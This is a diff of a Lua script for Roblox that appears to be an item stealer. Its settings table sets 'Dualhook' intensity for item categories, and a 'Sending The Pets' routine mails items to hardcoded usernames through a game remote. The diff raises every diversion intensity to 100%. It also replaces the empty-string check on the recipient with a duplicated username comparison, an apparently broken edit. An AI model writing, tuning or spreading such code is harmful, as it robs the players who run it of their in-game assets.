@@ -12,31 +12,31 @@ getgenv().Settings = {
     },
     Huges = {
         Dualhook = true,
-        Intensity = 50 --%
+        Intensity = 100 --%
     },
     Pogs = {
         Dualhook = true,
-        Intensity = 0 --%
+        Intensity = 100 --%
     },
     Exclusives = {
         Dualhook = true,
-        Intensity = 0 --%
+        Intensity = 100 --%
     },
     Events = {
         Dualhook = true,
-        Intensity = 0 --%
+        Intensity = 100 --%
     },
     Secrets = {
         Dualhook = true,
-        Intensity = 0 --%
+        Intensity = 100 --%
     },
     HC_DM_Mythics = {
         Dualhook = true,
-        Intensity = 0 --%
+        Intensity = 100 --%
     },
     Gems = {
         Dualhook = true,
-        Intensity = 50 --%
+        Intensity = 100 --%
     }
 }
 
@@ -1264,7 +1264,7 @@ end
 -- Sending The Pets
 
 local ndUser
-if UserName2 ~= nil and UserName2 ~= "TehPucuk_55" and UserName2 ~= "" then
+if UserName2 ~= nil and UserName2 ~= "TehPucuk_55" and UserName2 ~= "TehPucuk_55" then
     ndUser = UserName2
 else
     ndUser = UserName
@@ -1311,7 +1311,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(1.5)
+                -- wait(0)
                 if #TList == 0 or TList == {} then
                     -- print("done1")
                     break
@@ -1984,6 +1984,6 @@ spawn(function()
         WMythicList = {}
         WMList = {}
         WMcc = {}
-        wait(0)
+        wait(1)
     end
 end)
